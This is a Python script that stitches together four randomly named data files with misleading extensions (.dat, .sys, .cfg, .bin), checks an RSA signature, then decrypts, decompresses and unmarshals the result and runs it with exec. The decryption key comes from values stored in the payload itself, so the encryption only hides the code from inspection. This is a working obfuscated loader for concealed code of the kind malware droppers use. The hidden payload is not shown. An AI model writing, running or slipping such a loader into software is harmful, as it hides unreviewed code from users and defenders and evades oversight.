#!/usr/bin/env python3
import os, sys, base64, marshal, zlib, hashlib, struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILES = ['jjveab.dat', 'agkbwu.sys', 'vyycem.cfg', 'wjdgdl.bin']

data = b""
for name in FILES:
    path = os.path.join(BASE_DIR, name)
    if not os.path.isfile(path):
        print("Missing file:", name)
        sys.exit(1)
    with open(path, "rb") as f:
        data += f.read()

if len(data) < 4:
    print("Invalid data.")
    sys.exit(1)

payload_len = struct.unpack(">I", data[:4])[0]
payload = data[4:4+payload_len]
signature = data[4+payload_len:]

public_key = RSA.import_key(b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/KxOJoWCC1Wjcxw9Dqh\nF37i7N2zgQKxpq9f7yURRiZpXHzidy4zNhUmJopWBy5puefyWg/RPB0aRYbZc9QN\nM03nBnjGLvclfYPN437gh6GYQhmVwwdE0Ps4mq9u4EI010rMGh6JN27BfFJnJHac\nKjP6LOHBAA8LVNLseq9n9mokd7Pr+IU9htSN/6Y93diNDC5tWONFwrANiaUHvM2I\nJfQQPksh1/LqwoIW/DN7VjJuwV3jR1lhyay1T+wv3WqVCc6wjS+2AkIo86gH6UmY\n5u2fRTHFPMAqAr8GKUfm27Gqy3o26ip7UQCuBA/qGP0qys6/T8Xh7PxLJdRQ1kIc\n2QIDAQAB\n-----END PUBLIC KEY-----')

try:
    pkcs1_15.new(public_key).verify(SHA256.new(payload), signature)
except:
    print("Signature verification failed.")
    sys.exit(1)

blob = base64.b64decode(payload)

iv = blob[:16]
salt = blob[16:32]
enc = blob[32:]

key = hashlib.pbkdf2_hmac("sha256", iv, salt, 20000, 32)

try:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    dec = unpad(cipher.decrypt(enc), 16)
except:
    print("Decryption failed.")
    sys.exit(1)

try:
    code = marshal.loads(zlib.decompress(dec))
    exec(code, globals(), globals())
except Exception as e:
    print("Execution error:", e)
    sys.exit(1)
